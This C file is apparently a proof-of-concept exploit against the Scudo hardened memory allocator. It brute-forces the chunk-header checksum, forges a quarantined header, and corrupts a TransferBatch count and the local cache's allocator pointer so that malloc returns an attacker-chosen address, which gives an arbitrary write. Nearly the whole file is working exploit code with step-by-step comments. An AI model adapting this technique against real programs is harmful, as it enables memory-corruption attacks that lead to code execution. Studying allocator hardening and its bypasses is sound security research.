#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#define CRC32_(crc, value) __asm__("crc32\t" "(%1), %0" : "=r"(crc) : "r"(value), "0"(crc))

u_int32_t crc32(u_int32_t crc, void const *buf) {
        size_t crc0 = crc;
        CRC32_(crc0, &buf);
        return crc0;
}

size_t find_cksum(size_t cksum_inuse, int old_state, int new_state){ // Checksum while chunk is in use.
	unsigned int i=0;
        unsigned int _crc = 0;
        char *chunk_ptr = 0x41414141; // Doesn't really matter as you can guess. (Since it's constant)

        do{
                i++;
                _crc = crc32(crc32(i, chunk_ptr), old_state);
                _crc = _crc ^ _crc>>0x10;
        }while(_crc!=cksum_inuse);
        _crc = crc32(crc32(i, chunk_ptr), new_state);
        _crc = _crc ^ _crc>>0x10;

		//only 16 bits, so keep the bottom 2
        return _crc&0xffff;
}

enum AllocationState { Available = 0, Allocated = 1, Quarantined = 2};

int make_state(int classId, enum AllocationState state, int size) {
	return classId | (state << 8) | (size << 12);
}

char globalTarget[] = "Overwrite me please\n";

//NOTE: EXPORT UR FUCCIN VARS BEFORE RJUNNING NERD
int main() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	unsigned long * fakeAllocator = malloc(0x800);

	//Can be whatever size, as long as it still gets quarantined
	unsigned long * chunk = malloc(0x80);
	size_t normal_cksum = (*(chunk-2)) >> 48;

	// Chunk must be in quarantine before we corrupt header
	// Corrupting header before we free - the deallocation routine treates region 0 chunks are for secondary allcoator
	// whereas in quarantine they are treated as control chunks
	free(chunk);

	int old_state = make_state(7, Allocated, 0x80); //State when we read header
	int new_state = make_state(0, Quarantined, 0x80); //State we are setting it to

	unsigned long corrupted_cksum = find_cksum(normal_cksum, old_state, new_state);
	(*(chunk -2)) = (corrupted_cksum << 48) | new_state;


	//Flush quarantine
	// Our allocations, also, bc the cache for 0x10 chunks is empty, causes transferbatches to be allocated
	// Whatever we alloc here affects what region our transferbatch is for
	for (int i = 0 ; i < 0x2808 ; i++) {
		free(malloc(0x10));
	}

	//Corrupt count for our TransferBatch!! :))
	((unsigned int *)chunk)[11] = 0x40a;

	// Technically below are OoB writes - they dont *need* to be, if we can allocate a big enough chunk that still gets quarantined.
	// Alternatively - could spray chunks in the same region with the key values at what'd be the right offsets (assuming we're in a program w no OoB writes)
	// Also, if we assume we can corrupt the chunk's header several times, we could: Allocate a large enough chunk, then corrupt header to set its size to be smaller, free it, then continue with exploit

	// Corrupt Allocator of SizeClassAllocatorLocalCache
	chunk[0x202] = (unsigned long)fakeAllocator;

	// The PerClass will take this as the offset from the region base
	chunk[0x203] = 0x0;


	// This should overwrite the RegionBeg for Region 1, 
	// For a fake SizeClassAllocator64
	// -0x10 to account for chunk header
	fakeAllocator[0x24] = globalTarget - 0x10;


	// When a PerClass for a given region is empty, it'll call refill
	// doing so should corrupt the SizeClassLocalAllocator
	//Trigger refill for corruption

	// Note that we dont know exactly when the corrupting refill will trigger, bc our corrupted transfer-batch's place on the linked-list is random
	// allocate enough though, and itll happen
	for (int i = 0 ; i < 0x1000 ; i++) {
		void * tmp = malloc(0x10);
		if (tmp == globalTarget) {
			printf("SUCCESS");
			exit(0);
		}
	}
}
